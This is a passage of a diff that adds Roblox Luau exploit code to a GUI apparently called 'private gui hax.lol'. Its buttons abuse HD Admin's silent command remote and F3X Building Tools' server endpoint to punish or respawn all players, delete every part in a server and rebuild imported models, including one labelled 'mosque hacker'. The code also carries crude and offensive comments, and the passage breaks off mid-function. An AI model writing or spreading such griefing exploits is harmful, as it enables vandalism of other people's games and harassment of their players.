+			task.wait(1)
+			local model_id = "73318070496665"
+			local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
+			imported_model.Parent = game.Lighting
+	
+	
+			for _, v in next, imported_model:GetDescendants() do
+				pcall(function()
+					v.Anchored = true
+				end)
+			end
+	
+			local plr = game:GetService("Players").LocalPlayer
+			local f3x_name = "Building Tools"
+			local destination = workspace
+	
+			coroutine.wrap(function()
+				task.wait(10)
+				imported_model.Parent = nil
+			end)()
+	
+			function f3xbuildpart(part, cframe, destination, size, transparency, colour, material, collision, fake_part)
+				local allPartsData = {}
+	
+	
+				table.insert(allPartsData, {
+					Type = fake_part:IsA("WedgePart") and "Wedge" or fake_part:IsA("Seat") and "Seat" or fake_part:IsA("VehicleSeat") and "VehicleSeat" or fake_part:IsA("TrussPart") and "Truss" or fake_part:IsA("SpawnLocation") and "Spawn" or
+						fake_part.Shape == Enum.PartType.Block and "Normal" or
+						fake_part.Shape == Enum.PartType.Ball and "Ball" or
+						fake_part.Shape == Enum.PartType.Cylinder and "Cylinder",
+					CFrame = fake_part.CFrame,
+					Size = fake_part.Size,
+					Transparency = fake_part.Transparency,
+					Color = fake_part.Color,
+					Material = fake_part.Material,
+					Collision = fake_part.CanCollide,
+					Ref = fake_part,
+				})
+	
+				local sync = plr.Backpack:FindFirstChild(f3x_name).SyncAPI.ServerEndpoint
+				local partMap = {}
+	
+	
+				for _, data in ipairs(allPartsData) do
+					local created = sync:InvokeServer("CreatePart", data.Type, data.CFrame, destination)
+					partMap[data.Ref] = created
+				end
+	
+				for _, data in ipairs(allPartsData) do
+					local created = partMap[data.Ref]
+					if not created then continue end
+	
+					spawn(function()
+						if data.Size ~= Vector3.new(4,1,2) then
+							sync:InvokeServer("SyncResize", {
+								{ Part = created, CFrame = created.CFrame, Size = data.Size }
+							})
+						end
+	
+						if data.Transparency ~= 0 then
+							sync:InvokeServer("SyncMaterial", {
+								{ Part = created, Transparency = data.Transparency }
+							})
+						end
+	
+						if data.Color ~= BrickColor.new("Medium stone grey").Color then
+							sync:InvokeServer("SyncColor", {
+								{ Part = created, Color = data.Color, UnionColoring = true }
+							})
+						end
+	
+						if data.Material ~= "Plastic" then
+							sync:InvokeServer("SyncMaterial", {
+								{ Part = created, Material = data.Material }
+							})
+						end
+	
+						if data.Collision ~= true then
+							sync:InvokeServer("SyncCollision", {
+								{ Part = created, CanCollide = data.Collision }
+							})
+						end
+	
+						local ref = data.Ref
+	
+						local texture = ref:FindFirstChildOfClass("Texture")
+						if texture then
+							sync:InvokeServer("CreateTextures", {
+								{ Part = created, Face = texture.Face, TextureType = "Texture" }
+							})
+							sync:InvokeServer("SyncTexture", {
+								{ Part = created, Face = texture.Face, TextureType = "Texture", StudsPerTileU = texture.StudsPerTileU, StudsPerTileV = texture.StudsPerTileV, Texture = texture.Texture, Transparency = texture.Transparency }
+							})
+						end
+	
+						local decal = ref:FindFirstChildOfClass("Decal")
+						if decal then
+							sync:InvokeServer("CreateTextures", {
+								{ Part = created, Face = decal.Face, TextureType = "Decal" }
+							})
+							sync:InvokeServer("SyncTexture", {
+								{ Part = created, Face = decal.Face, TextureType = "Decal", Texture = decal.Texture, Transparency = decal.Transparency }
+							})
+						end
+	
+						local mesh = ref:FindFirstChildOfClass("SpecialMesh")
+						if mesh then
+							sync:InvokeServer("CreateMeshes", {
+								{ Part = created }
+							})
+							sync:InvokeServer("SyncMesh", {
+								{ Part = created, MeshId = mesh.MeshId, TextureId = mesh.TextureId, Scale = mesh.Scale }
+							})
+						end
+	
+						local light1 = ref:FindFirstChildOfClass("SpotLight")
+						if light1 then
+							sync:InvokeServer("CreateLights", {
+								{ Part = created, LightType = "SpotLight" }
+							})
+							sync:InvokeServer("SyncLighting", {
+								{ Part = created, LightType = "SpotLight", Color = light1.Color, Range = light1.Range, Face = light1.Face, Angle = light1.Angle, Shadows = light1.Shadows }
+							})
+						end
+	
+						local light2 = ref:FindFirstChildOfClass("PointLight")
+						if light2 then
+							sync:InvokeServer("CreateLights", {
+								{ Part = created, LightType = "PointLight" }
+							})
+							sync:InvokeServer("SyncLighting", {
+								{ Part = created, LightType = "PointLight", Color = light2.Color, Range = light2.Range, Shadows = light2.Shadows }
+							})
+	
+						end
+					end)
+				end
+			end
+	
+			for _, part in next, imported_model:GetDescendants() do
+				local function spawnpart(fn)
+					task.spawn(fn)
+				end
+				if part:IsA("Part") then
+					if part.Shape == Enum.PartType.Block then
+						spawnpart(function()
+							f3xbuildpart("Normal", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+						end)
+					elseif part.Shape == Enum.PartType.Ball then
+						spawnpart(function()
+							f3xbuildpart("Ball", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+						end)
+					elseif part.Shape == Enum.PartType.Cylinder then
+						spawnpart(function()
+							f3xbuildpart("Cylinder", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+						end)
+					end
+				elseif part:IsA("WedgePart") then
+					spawnpart(function()
+						f3xbuildpart("Wedge", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("Seat") then
+					spawnpart(function()
+						f3xbuildpart("Seat", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("TrussPart") then
+					spawnpart(function()
+						f3xbuildpart("Truss", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("VehicleSeat") then
+					spawnpart(function()
+						f3xbuildpart("VehicleSeat", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				elseif part:IsA("SpawnLocation") then
+					spawnpart(function()
+						f3xbuildpart("Spawn", part.CFrame, destination, part.Size, part.Transparency, part.Color, part.Material, part.CanCollide, part)
+					end)
+				end
+			end
+	
+			print("Finished build.")
+	
+			task.wait(1)
+	
+	
+	
+	
+		end
+	
+		realm()
+	
+		wait(2)
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";respawn all")
+		RequestCommand:InvokeServer(";btools me")
+		RequestCommand:InvokeServer(";r6 all")
+		RequestCommand:InvokeServer(";ff all")
+		RequestCommand:InvokeServer(";char all WHYROBLOX322")
+		RequestCommand:InvokeServer(";btools WHYROBLOX322")
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+	
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		-- i dont used the b2s sky function anymore, i used this instead
+		local hack = workspace:FindFirstChild("E")
+		if hack then
+			call({ "Remove", { hack } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 7, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
+	
+		task.spawn(function()
+			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
+		end)
+	
+		task.spawn(function()
+			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
+		end)
+	
+		task.spawn(function()
+			call({ "CreateMeshes", { { Part = sky } } })
+		end)
+	
+		task.spawn(function()
+			call({
+				"SyncMesh",
+				{{
+					Part = sky,
+					MeshId = "rbxassetid://111891702759441",
+					TextureId = "rbxassetid://118528938046323",
+					Scale = Vector3.new(99999, 99999, 99999),
+					VertexColor = Vector3.new(3.6, 3.6, 3.6)
+				}}
+			})
+		end)
+	
+		task.spawn(function()
+			call({ "SetLocked", { sky }, true })
+		end)
+	
+		task.spawn(function()
+			call({ "SetName", { sky }, "E" })
+		end)
+	
+		task.spawn(function()
+			call({ "SyncMaterial", { { Part = sky, Transparency = 0.7 } } })
+		end)
+	
+		task.spawn(function()
+			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
+		end)
+	
+	
+	
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommandSilent:InvokeServer(";music 80609898198544")
+		RequestCommandSilent:InvokeServer(";volume inf")
+		RequestCommandSilent:InvokeServer(";pitch 0.2")
+	end)
+end;
+task.spawn(C_2ab);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+function C_2ad()
+local script = G2L["2ad"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- fixed by 1sw0rd1
+		-- credit to 1sword1
+		-- (edited script anti crash by Elv4r0x)
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local character = player.Character 
+		local char = player.Character
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";punish all")
+	
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+			return
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					serverendpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function delete(part)
+			ohno({"Remove", {part}})
+		end
+	
+		local function deleteall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "kys" then
+					task.defer(function()
+						pcall(function()
+							delete(v)
+						end)
+					end)
+				end
+			end
+		end
+	
+		deleteall()
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+				tool = v.Parent
+			end
+		end
+		if tool == nil then
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+	
+		local model_id = "136758770863986" -- mosque hacker
+		local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
+		imported_model.Parent = game.Lighting
+	
+		local destination = workspace:FindFirstChildOfClass("Terrain")
+		if tool ~= nil and tool:FindFirstChild("Tools") and tool:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+			destination = workspace
+		end
+	
+		for _, v in next, imported_model:GetDescendants() do
+			pcall(function() v.Anchored = true end)
+		end
+	
+		local totalparts = {}
+		local total = 0
+		local completed = 0
+	
+		for i,v in pairs(imported_model:GetDescendants()) do
+			if v:IsA("Part") or v:IsA("WedgePart") or v:IsA("Seat") or v:IsA("VehicleSeat") or v:IsA("TrussPart") or v:IsA("SpawnLocation") or v:IsA("CornerWedgePart") then
+				total += 1
+				local Type = v:IsA("WedgePart") and "Wedge" or v:IsA("Seat") and "Seat" or v:IsA("VehicleSeat") and "Vehicle Seat" or v:IsA("TrussPart") and "Truss" or v:IsA("SpawnLocation") and "Spawn" or v:IsA("CornerWedgePart") and "Corner" or
+					v.Shape == Enum.PartType.Block and "Normal" or
+					v.Shape == Enum.PartType.Ball and "Ball" or
+					v.Shape == Enum.PartType.Cylinder and "Cylinder"
+				task.defer(function()
+					local part = remote:InvokeServer("CreatePart", Type, v.CFrame, destination)
+					table.insert(totalparts, {new = part, old = v})
+					completed += 1
+				end)
+			end
+		end
+	
+		while completed < total do
+			task.wait()
+		end
+	
+		local syncResize = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncResize, {Part = data.new, CFrame = data.old.CFrame, Size = data.old.Size})
+		end
+		remote:InvokeServer("SyncResize", syncResize)
+	
+		local syncCollision = {}
+		for i,data in pairs(totalparts) do
+			if data.old.CanCollide ~= true then
+				table.insert(syncCollision, {Part = data.new, CanCollide = data.old.CanCollide})
+			end
+		end
+		if #syncCollision > 0 then
+			remote:InvokeServer("SyncCollision", syncCollision)
+		end
+	
+		local syncColor = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncColor, {Part = data.new, Color = data.old.Color})
+		end
+		remote:InvokeServer("SyncColor", syncColor)
+	
+		local syncMaterial = {}
+		for i,data in pairs(totalparts) do
+			if data.old.Material ~= "Plastic" or data.old.Reflectance ~= 0 or data.old.Transparency ~= 0 then
+				table.insert(syncMaterial, {Part = data.new, Material = data.old.Material, Transparency = data.old.Transparency, Reflectance = data.old.Reflectance})
+			end
+		end
+		if #syncMaterial > 0 then
+			remote:InvokeServer("SyncMaterial", syncMaterial)
+		end
+	
+		local syncSurface = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncSurface, {Part = data.new, Surfaces = {Top = data.old.TopSurface, Front = data.old.FrontSurface, Bottom = data.old.BottomSurface, Right = data.old.RightSurface, Left = data.old.LeftSurface, Back = data.old.BackSurface}})
+		end
+		remote:InvokeServer("SyncSurface", syncSurface)
+	
+		local createMeshes = {}
+		local syncMesh = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("SpecialMesh")
+			if mesh then
+				table.insert(createMeshes, {Part = data.new})
+				table.insert(syncMesh, {Part = data.new, MeshId = mesh.MeshId, TextureId = mesh.TextureId, Scale = mesh.Scale, MeshType = mesh.MeshType, VertexColor = mesh.VertexColor})
+			end
+		end
+		if #createMeshes > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshes)
+			remote:InvokeServer("SyncMesh", syncMesh)
+		end
+	
+		local createMeshesCyl = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("CylinderMesh")
+			if mesh then
+				table.insert(createMeshesCyl, {Part = data.new})
+			end
+		end
+		if #createMeshesCyl > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshesCyl)
+		end
+	
+		local createLightsSpot = {}
+		local syncLightSpot = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SpotLight")
+			if light then
+				table.insert(createLightsSpot, {Part = data.new, LightType = "SpotLight"})
+				table.insert(syncLightSpot, {Part = data.new, LightType = "SpotLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSpot > 0 then
+			remote:InvokeServer("CreateLights", createLightsSpot)
+			remote:InvokeServer("SyncLighting", syncLightSpot)
+		end
+	
+		local createLightsPoint = {}
+		local syncLightPoint = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("PointLight")
+			if light then
+				table.insert(createLightsPoint, {Part = data.new, LightType = "PointLight"})
+				table.insert(syncLightPoint, {Part = data.new, LightType = "PointLight", Color = light.Color, Range = light.Range, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsPoint > 0 then
+			remote:InvokeServer("CreateLights", createLightsPoint)
+			remote:InvokeServer("SyncLighting", syncLightPoint)
+		end
+	
+		local createLightsSurface = {}
+		local syncLightSurface = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SurfaceLight")
+			if light then
+				table.insert(createLightsSurface, {Part = data.new, LightType = "SurfaceLight"})
+				table.insert(syncLightSurface, {Part = data.new, LightType = "SurfaceLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSurface > 0 then
+			remote:InvokeServer("CreateLights", createLightsSurface)
+			remote:InvokeServer("SyncLighting", syncLightSurface)
+		end
+	
+		local createTextures = {}
+		local syncTexture = {}
+		local createDecals = {}
+		local syncDecal = {}
+		local createFire = {}
+		local syncFire = {}
+		local createSparkles = {}
+		local syncSparkles = {}
+		local createSmoke = {}
+		local syncSmoke = {}
+	
+		for i,data in pairs(totalparts) do
+			local old = data.old
+			local new = data.new
+			for _, child in ipairs(old:GetChildren()) do
+				if child:IsA("Texture") then
+					table.insert(createTextures, {Part = new, Face = child.Face, TextureType = "Texture"})
+					table.insert(syncTexture, {Part = new, Face = child.Face, TextureType = "Texture", StudsPerTileU = child.StudsPerTileU, StudsPerTileV = child.StudsPerTileV, Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Decal") then
+					table.insert(createDecals, {Part = new, Face = child.Face, TextureType = "Decal"})
+					table.insert(syncDecal, {Part = new, Face = child.Face, TextureType = "Decal", Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Fire") and child.Enabled then
+					table.insert(createFire, {Part = new, DecorationType = "Fire"})
+					table.insert(syncFire, {Part = new, DecorationType = "Fire", Color = child.Color, SecondaryColor = child.SecondaryColor, Size = child.Size, Heat = child.Heat})
+				elseif child:IsA("Sparkles") and child.Enabled then
+					table.insert(createSparkles, {Part = new, DecorationType = "Sparkles"})
+					table.insert(syncSparkles, {Part = new, DecorationType = "Sparkles", SparkleColor = child.SparkleColor})
+				elseif child:IsA("Smoke") and child.Enabled then
+					table.insert(createSmoke, {Part = new, DecorationType = "Smoke"})
+					table.insert(syncSmoke, {Part = new, DecorationType = "Smoke", Color = child.Color, Size = child.Size, RiseVelocity = child.RiseVelocity, Opacity = child.Opacity})
+				end
+			end
+		end
+	
+		if #createTextures > 0 then
+			remote:InvokeServer("CreateTextures", createTextures)
+			remote:InvokeServer("SyncTexture", syncTexture)
+		end
+		if #createDecals > 0 then
+			remote:InvokeServer("CreateTextures", createDecals)
+			remote:InvokeServer("SyncTexture", syncDecal)
+		end
+		if #createFire > 0 then
+			remote:InvokeServer("CreateDecorations", createFire)
+			remote:InvokeServer("SyncDecorate", syncFire)
+		end
+		if #createSparkles > 0 then
+			remote:InvokeServer("CreateDecorations", createSparkles)
+			remote:InvokeServer("SyncDecorate", syncSparkles)
+		end
+		if #createSmoke > 0 then
+			remote:InvokeServer("CreateDecorations", createSmoke)
+			remote:InvokeServer("SyncDecorate", syncSmoke)
+		end
+	
+		imported_model.Parent = nil
+	
+		RequestCommand:InvokeServer(";res all")
+	end)
+end;
+task.spawn(C_2ad);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.LocalScript
+function C_2ae()
+local script = G2L["2ae"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- fixed by 1sw0rd1
+		-- credit to 1sword1
+		-- (edited script anti crash by Elv4r0x)
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local character = player.Character 
+		local char = player.Character
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";punish all ;time 14")
+	
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+			return
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					serverendpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function delete(part)
+			ohno({"Remove", {part}})
+		end
+	
+		local function deleteall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "kys" then
+					task.defer(function()
+						pcall(function()
+							delete(v)
+						end)
+					end)
+				end
+			end
+		end
+	
+		deleteall()
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+				tool = v.Parent
+			end
+		end
+		if tool == nil then
+			for i,v in player:GetDescendants() do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+				end
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+	
+		local model_id = "3022837043"
+		local imported_model = game:GetObjects("rbxassetid://" .. model_id)[1]
+		imported_model.Parent = game.Lighting
+	
+		local destination = workspace:FindFirstChildOfClass("Terrain")
+		if tool ~= nil and tool:FindFirstChild("Tools") and tool:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
+			destination = workspace
+		end
+	
+		for _, v in next, imported_model:GetDescendants() do
+			pcall(function() v.Anchored = true end)
+		end
+	
+		local totalparts = {}
+		local total = 0
+		local completed = 0
+	
+		for i,v in pairs(imported_model:GetDescendants()) do
+			if v:IsA("Part") or v:IsA("WedgePart") or v:IsA("Seat") or v:IsA("VehicleSeat") or v:IsA("TrussPart") or v:IsA("SpawnLocation") or v:IsA("CornerWedgePart") then
+				total += 1
+				local Type = v:IsA("WedgePart") and "Wedge" or v:IsA("Seat") and "Seat" or v:IsA("VehicleSeat") and "Vehicle Seat" or v:IsA("TrussPart") and "Truss" or v:IsA("SpawnLocation") and "Spawn" or v:IsA("CornerWedgePart") and "Corner" or
+					v.Shape == Enum.PartType.Block and "Normal" or
+					v.Shape == Enum.PartType.Ball and "Ball" or
+					v.Shape == Enum.PartType.Cylinder and "Cylinder"
+				task.defer(function()
+					local part = remote:InvokeServer("CreatePart", Type, v.CFrame, destination)
+					table.insert(totalparts, {new = part, old = v})
+					completed += 1
+				end)
+			end
+		end
+	
+		while completed < total do
+			task.wait()
+		end
+	
+		local syncResize = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncResize, {Part = data.new, CFrame = data.old.CFrame, Size = data.old.Size})
+		end
+		remote:InvokeServer("SyncResize", syncResize)
+	
+		local syncCollision = {}
+		for i,data in pairs(totalparts) do
+			if data.old.CanCollide ~= true then
+				table.insert(syncCollision, {Part = data.new, CanCollide = data.old.CanCollide})
+			end
+		end
+		if #syncCollision > 0 then
+			remote:InvokeServer("SyncCollision", syncCollision)
+		end
+	
+		local syncColor = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncColor, {Part = data.new, Color = data.old.Color})
+		end
+		remote:InvokeServer("SyncColor", syncColor)
+	
+		local syncMaterial = {}
+		for i,data in pairs(totalparts) do
+			if data.old.Material ~= "Plastic" or data.old.Reflectance ~= 0 or data.old.Transparency ~= 0 then
+				table.insert(syncMaterial, {Part = data.new, Material = data.old.Material, Transparency = data.old.Transparency, Reflectance = data.old.Reflectance})
+			end
+		end
+		if #syncMaterial > 0 then
+			remote:InvokeServer("SyncMaterial", syncMaterial)
+		end
+	
+		local syncSurface = {}
+		for i,data in pairs(totalparts) do
+			table.insert(syncSurface, {Part = data.new, Surfaces = {Top = data.old.TopSurface, Front = data.old.FrontSurface, Bottom = data.old.BottomSurface, Right = data.old.RightSurface, Left = data.old.LeftSurface, Back = data.old.BackSurface}})
+		end
+		remote:InvokeServer("SyncSurface", syncSurface)
+	
+		local createMeshes = {}
+		local syncMesh = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("SpecialMesh")
+			if mesh then
+				table.insert(createMeshes, {Part = data.new})
+				table.insert(syncMesh, {Part = data.new, MeshId = mesh.MeshId, TextureId = mesh.TextureId, Scale = mesh.Scale, MeshType = mesh.MeshType, VertexColor = mesh.VertexColor})
+			end
+		end
+		if #createMeshes > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshes)
+			remote:InvokeServer("SyncMesh", syncMesh)
+		end
+	
+		local createMeshesCyl = {}
+		for i,data in pairs(totalparts) do
+			local mesh = data.old:FindFirstChildOfClass("CylinderMesh")
+			if mesh then
+				table.insert(createMeshesCyl, {Part = data.new})
+			end
+		end
+		if #createMeshesCyl > 0 then
+			remote:InvokeServer("CreateMeshes", createMeshesCyl)
+		end
+	
+		local createLightsSpot = {}
+		local syncLightSpot = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SpotLight")
+			if light then
+				table.insert(createLightsSpot, {Part = data.new, LightType = "SpotLight"})
+				table.insert(syncLightSpot, {Part = data.new, LightType = "SpotLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSpot > 0 then
+			remote:InvokeServer("CreateLights", createLightsSpot)
+			remote:InvokeServer("SyncLighting", syncLightSpot)
+		end
+	
+		local createLightsPoint = {}
+		local syncLightPoint = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("PointLight")
+			if light then
+				table.insert(createLightsPoint, {Part = data.new, LightType = "PointLight"})
+				table.insert(syncLightPoint, {Part = data.new, LightType = "PointLight", Color = light.Color, Range = light.Range, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsPoint > 0 then
+			remote:InvokeServer("CreateLights", createLightsPoint)
+			remote:InvokeServer("SyncLighting", syncLightPoint)
+		end
+	
+		local createLightsSurface = {}
+		local syncLightSurface = {}
+		for i,data in pairs(totalparts) do
+			local light = data.old:FindFirstChildOfClass("SurfaceLight")
+			if light then
+				table.insert(createLightsSurface, {Part = data.new, LightType = "SurfaceLight"})
+				table.insert(syncLightSurface, {Part = data.new, LightType = "SurfaceLight", Color = light.Color, Range = light.Range, Face = light.Face, Angle = light.Angle, Shadows = light.Shadows})
+			end
+		end
+		if #createLightsSurface > 0 then
+			remote:InvokeServer("CreateLights", createLightsSurface)
+			remote:InvokeServer("SyncLighting", syncLightSurface)
+		end
+	
+		local createTextures = {}
+		local syncTexture = {}
+		local createDecals = {}
+		local syncDecal = {}
+		local createFire = {}
+		local syncFire = {}
+		local createSparkles = {}
+		local syncSparkles = {}
+		local createSmoke = {}
+		local syncSmoke = {}
+	
+		for i,data in pairs(totalparts) do
+			local old = data.old
+			local new = data.new
+			for _, child in ipairs(old:GetChildren()) do
+				if child:IsA("Texture") then
+					table.insert(createTextures, {Part = new, Face = child.Face, TextureType = "Texture"})
+					table.insert(syncTexture, {Part = new, Face = child.Face, TextureType = "Texture", StudsPerTileU = child.StudsPerTileU, StudsPerTileV = child.StudsPerTileV, Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Decal") then
+					table.insert(createDecals, {Part = new, Face = child.Face, TextureType = "Decal"})
+					table.insert(syncDecal, {Part = new, Face = child.Face, TextureType = "Decal", Texture = child.Texture, Transparency = child.Transparency})
+				elseif child:IsA("Fire") and child.Enabled then
+					table.insert(createFire, {Part = new, DecorationType = "Fire"})
+					table.insert(syncFire, {Part = new, DecorationType = "Fire", Color = child.Color, SecondaryColor = child.SecondaryColor, Size = child.Size, Heat = child.Heat})
+				elseif child:IsA("Sparkles") and child.Enabled then
+					table.insert(createSparkles, {Part = new, DecorationType = "Sparkles"})
+					table.insert(syncSparkles, {Part = new, DecorationType = "Sparkles", SparkleColor = child.SparkleColor})
+				elseif child:IsA("Smoke") and child.Enabled then
+					table.insert(createSmoke, {Part = new, DecorationType = "Smoke"})
+					table.insert(syncSmoke, {Part = new, DecorationType = "Smoke", Color = child.Color, Size = child.Size, RiseVelocity = child.RiseVelocity, Opacity = child.Opacity})
+				end
+			end
+		end
+	
+		if #createTextures > 0 then
+			remote:InvokeServer("CreateTextures", createTextures)
+			remote:InvokeServer("SyncTexture", syncTexture)
+		end
+		if #createDecals > 0 then
+			remote:InvokeServer("CreateTextures", createDecals)
+			remote:InvokeServer("SyncTexture", syncDecal)
+		end
+		if #createFire > 0 then
+			remote:InvokeServer("CreateDecorations", createFire)
+			remote:InvokeServer("SyncDecorate", syncFire)
+		end
+		if #createSparkles > 0 then
+			remote:InvokeServer("CreateDecorations", createSparkles)
+			remote:InvokeServer("SyncDecorate", syncSparkles)
+		end
+		if #createSmoke > 0 then
+			remote:InvokeServer("CreateDecorations", createSmoke)
+			remote:InvokeServer("SyncDecorate", syncSmoke)
+		end
+	
+		imported_model.Parent = nil
+	
+		RequestCommand:InvokeServer(";res all")
+	end)
+end;
+task.spawn(C_2ae);
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollMap.Button.Button.LocalScript
+function C_2b0()
+local script = G2L["2b0"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- Epstein fuck b2s
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		RequestCommand:InvokeServer(";time ;fogcolor black ;btools")
+		wait(0.4)
+		RequestCommand:InvokeServer(";hideguis others")
+		wait(0.1)
+		local player = game.Players.LocalPlayer
+		local char = player.Character
